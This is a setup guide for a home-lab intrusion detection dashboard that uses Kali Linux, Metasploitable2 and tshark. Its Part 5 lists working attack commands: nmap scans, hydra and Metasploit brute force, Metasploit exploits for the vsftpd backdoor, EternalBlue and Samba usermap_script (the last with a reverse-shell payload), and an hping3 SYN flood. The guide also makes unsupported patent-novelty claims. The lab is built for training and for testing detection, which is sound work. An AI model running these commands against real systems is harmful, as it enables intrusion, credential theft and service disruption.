# Cyber Threat Sandbox v5.0
## Complete Setup Guide — Kali Linux + Metasploitable2 + tshark + Behavioral IDS

---

## What This System Does

A real-time network intrusion detection dashboard with:
- **Live packet capture** via tshark (Wireshark CLI)
- **Metasploitable2 CVE-aware detection** — identifies known exploit patterns
- **Kali Linux integration** — simulates or receives real Kali attack traffic
- **Bayesian confidence scoring** — confidence decays over time, no false positives from stale data
- **7-rule behavioral engine** — port scan, brute force, flood, recon chains, exploit chains
- **Exploit chain detection** — detects VSFTPD backdoor, EternalBlue, Samba, etc.
- **MITRE ATT&CK mapping** on every detection

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│  KALI LINUX (attacker)          METASPLOITABLE2 (target)        │
│  192.168.56.101                 192.168.56.102                   │
│  nmap, hydra, msfconsole        vsftpd 2.3.4, Samba, MySQL...   │
└──────────────────┬──────────────────────┬───────────────────────┘
                   │  Host-Only Network    │
                   ▼                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  YOUR HOST MACHINE (runs the dashboard)                         │
│                                                                  │
│  tshark → packet metadata (NO payload)                          │
│       ↓                                                          │
│  DetectionEngine v5 (Bayesian + CVE-aware)                      │
│       ↓                                                          │
│  Flask API → dashboard.html (real-time UI)                      │
│  http://localhost:5000                                           │
└─────────────────────────────────────────────────────────────────┘
```

---

## Part 1: Install Kali Linux

### Option A: VirtualBox (Recommended)

1. Download VirtualBox: https://www.virtualbox.org/wiki/Downloads
2. Download Kali Linux ISO: https://www.kali.org/get-kali/#kali-virtual-machines
   - Use the **VirtualBox OVA** file (easiest)
3. In VirtualBox → File → Import Appliance → select the `.ova`
4. Before starting Kali: Settings → Network → Adapter 1 → **Host-Only Adapter**
   - This creates an isolated network between your VMs
5. Start Kali Linux. Login: `kali/kali`

### Option B: VMware Workstation Player

1. Download VMware: https://www.vmware.com/products/workstation-player.html
2. Download Kali VMware image from kali.org
3. Network adapter → **Host-Only**
4. Start Kali. Login: `kali/kali`

### Find Kali's IP

```bash
# In Kali terminal:
ip addr show eth0
# OR
ifconfig
# Note the 192.168.56.x address
```

---

## Part 2: Install Metasploitable2

Metasploitable2 is an intentionally vulnerable Ubuntu VM made by Rapid7.

### Download

```bash
# From SourceForge (official):
https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

# Download: Metasploitable2-Linux.zip (~900 MB)
```

### Import into VirtualBox

1. Extract the `.zip` → you get a `.vmdk` disk file
2. VirtualBox → New → Name: `Metasploitable2`
   - Type: Linux, Version: Ubuntu (32-bit)
   - RAM: 512 MB
   - Use existing virtual hard disk → select the `.vmdk`
3. Settings → Network → Adapter 1 → **Host-Only Adapter**
   - Must be the **same** host-only network as Kali
4. Start Metasploitable2. Login: `msfadmin / msfadmin`

### Find Metasploitable2's IP

```bash
# In Metasploitable2 terminal:
ifconfig eth0
# Note the 192.168.56.x address (usually 192.168.56.102)
```

### Verify Connectivity

```bash
# From Kali:
ping 192.168.56.102       # Should get replies from MSF2
nmap -sn 192.168.56.0/24  # Should see both VMs
```

---

## Part 3: Install the Dashboard (on your host machine)

### Install Python dependencies

```bash
# Clone or copy the sandbox_v5 folder to your machine

# Install Python packages
pip install flask flask-cors fpdf2 --break-system-packages

# OR use pip3:
pip3 install flask flask-cors fpdf2
```

### Install tshark (Wireshark CLI)

```bash
# Ubuntu / Kali / Debian:
sudo apt update
sudo apt install tshark -y

# During install: select YES to allow non-root users to capture packets
# (or always run with sudo)

# macOS (Homebrew):
brew install wireshark

# Windows:
# Install Wireshark from https://www.wireshark.org/download.html
# tshark is included in the Wireshark installer
```

### Verify tshark

```bash
tshark --version
# Should show: TShark (Wireshark) x.x.x

tshark -D
# Lists available network interfaces
```

---

## Part 4: Configure the Dashboard

### Project Structure

```
sandbox_v5/
├── app.py                        ← Flask server (main entry point)
├── requirements.txt
├── backend/
│   ├── __init__.py
│   └── detector.py               ← Detection engine v5
├── frontend/
│   └── templates/
│       └── dashboard.html        ← UI
├── capture/                      ← Drop .pcap files here
└── reports/                      ← Exported incident reports
```

### Run in Simulation Mode (no privileges needed)

```bash
cd sandbox_v5
python3 app.py
# Open browser: http://localhost:5000
```

### Run with Live Capture (requires sudo/admin)

```bash
# Linux / macOS:
sudo python3 app.py

# Windows (run as Administrator):
python app.py
```

### Configure Lab IPs (in the dashboard UI)

1. Open http://localhost:5000
2. Click the **Lab Config** tab
3. Set:
   - **Kali IP**: `192.168.56.101` (your Kali VM's IP)
   - **Metasploitable2 IP**: `192.168.56.102` (your MSF2 VM's IP)
   - **Capture Interface**: your interface connected to host-only network
     - Check with: `tshark -D` or `ip addr`
4. Enable **MSF2 Target Mode** to filter live capture to MSF2 only
5. Click **Save Config**

---

## Part 5: Running Kali Attacks & Seeing Detections

### In the Dashboard

1. Go to http://localhost:5000
2. Click **▶ Start** (simulation mode works immediately)
3. Click the **mode badge** to switch to **LIVE** if using real traffic

### From Kali Terminal — Attack Commands

#### 1. Port Scan (triggers PORT_SCAN → CRITICAL)
```bash
# Basic Nmap scan
nmap -sV 192.168.56.102

# Aggressive scan (triggers faster)
nmap -A -T4 192.168.56.102

# Full port scan
nmap -p- 192.168.56.102
```

#### 2. SSH Brute Force (triggers BRUTE_FORCE → CRITICAL)
```bash
# Hydra SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102

# Metasploit SSH scanner
msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.56.102; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
```

#### 3. VSFTPD 2.3.4 Backdoor — CVE-2011-2523 (triggers BACKDOOR_PORT → CRITICAL)
```bash
msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.102; run"
# Dashboard will show port 21 probe → port 6200 (backdoor shell) → BACKDOOR_PORT detection
```

#### 4. EternalBlue / MS17-010 — SMB exploit (triggers MSF2_RECON → CRITICAL)
```bash
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.56.102; run"
# Note: MSF2 is Linux so this won't succeed, but the traffic pattern is detected
```

#### 5. Samba Username Map Script — CVE-2007-2447
```bash
msfconsole -x "use exploit/multi/samba/usermap_script; set RHOSTS 192.168.56.102; set PAYLOAD cmd/unix/reverse; set LHOST 192.168.56.101; run"
```

#### 6. MySQL Brute Force (triggers BRUTE_FORCE on port 3306)
```bash
msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS 192.168.56.102; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
```

#### 7. DDoS Flood (triggers TRAFFIC_FLOOD → CRITICAL)
```bash
# hping3 SYN flood
hping3 --flood --rand-source --syn -p 80 192.168.56.102

# Stop with Ctrl+C after a few seconds
```

---

## Part 6: What to Observe in the Dashboard

### Live Feed Tab
- Watch events stream in real-time
- **Blue IPs** = normal traffic
- **Cyan IPs** = Kali attacker (highlighted)
- **CVE column** shows relevant CVEs (CVE-2011-2523, etc.)
- Click any row to open the detail drawer with:
  - Full behavioral explanation
  - MITRE ATT&CK mapping
  - Relevant CVEs
  - Kali command that would produce this traffic
  - Attack phase (idle → recon → exploit → impact)
  - Defender playbook actions

### Topology Panel
- **Red pulsing node** = Metasploitable2 target
- **Blue nodes** = attacker IPs
- **Cyan nodes** = Kali Linux attacker (special highlight)
- Packet animations show attack direction

### Scenarios Tab
- Shows all 7 built-in attack scenarios
- Each shows the **real Kali command** that produces it
- Click **⚡ Inject Now** to simulate without needing a real Kali VM

---

## Part 7: Using the Replay System

1. Click the **Replay** tab
2. Drag the slider to replay any point in the captured session
3. Useful for post-incident analysis and training

---

## Patentable Innovations in This System

### Patent Claim 1: Bayesian-Decay Confidence Scoring
Each detection confidence score degrades exponentially with time using:
```
weight(t) = exp(-t × ln(2) / half_life)
```
This prevents stale threat evidence from masking current activity. No existing open-source IDS does this.

### Patent Claim 2: CVE-Aware Service Fingerprinting
Every monitored port is mapped to its known CVEs. When a port matching a CVE profile is accessed, the CVE is propagated to the detection result and incident report. Combines behavioral + vulnerability intelligence in real-time.

### Patent Claim 3: Exploit Chain Pattern Matching
The engine maintains a rolling port access buffer per IP and matches it against 12 known Metasploitable2/Metasploit exploit chains (VSFTPD, EternalBlue, etc.). Chain detection boosts confidence score by 15%.

### Patent Claim 4: Attacker Intent Vector
A composite score combining: packet rate, port sensitivity, phase advancement, and OPSEC score (slow deliberate attacks score higher intent than noisy scans). This is an independent metric beyond simple threshold rules.

### Patent Claim 5: Cross-IP Distributed Attack Correlation
The engine tracks subnet-level activity and cross-IP port access. Multiple IPs from the same /24 subnet hitting the same ports signals a distributed scan — invisible to per-IP rule engines.

---

## Troubleshooting

### "tshark: Permission denied"
```bash
sudo python3 app.py
# OR add yourself to wireshark group:
sudo usermod -aG wireshark $USER
# Log out and back in, then run without sudo
```

### "No packets in live mode"
1. Did you click START after switching to LIVE?
2. Is there traffic? Browse a website or ping something
3. Check the capture interface: `tshark -D`
4. Update Lab Config with the correct interface name

### "Kali can't reach Metasploitable2"
- Both VMs must use the **same host-only network**
- Check VirtualBox Host Network Manager → same subnet
- Both VMs: `ping <other VM's IP>`

### Flask won't start
```bash
pip install flask flask-cors --break-system-packages
# Check Python version:
python3 --version   # needs 3.9+
```

### Metasploitable2 slow to boot
- Allocate at least 512MB RAM
- It takes ~60 seconds to fully boot
- Login: msfadmin / msfadmin

---

## Quick Reference: Default IPs

| Machine | Default IP | Notes |
|---------|-----------|-------|
| Kali Linux | 192.168.56.101 | Attacker |
| Metasploitable2 | 192.168.56.102 | Target |
| Dashboard host | 192.168.56.1 | Your machine |
| Dashboard URL | http://localhost:5000 | |

---

## References

- Metasploitable2: https://docs.rapid7.com/metasploit/metasploitable-2
- Kali Linux: https://www.kali.org
- tshark docs: https://www.wireshark.org/docs/man-pages/tshark.html
- MITRE ATT&CK: https://attack.mitre.org
- VSFTPD CVE: https://nvd.nist.gov/vuln/detail/CVE-2011-2523
- EternalBlue: https://nvd.nist.gov/vuln/detail/CVE-2017-0144
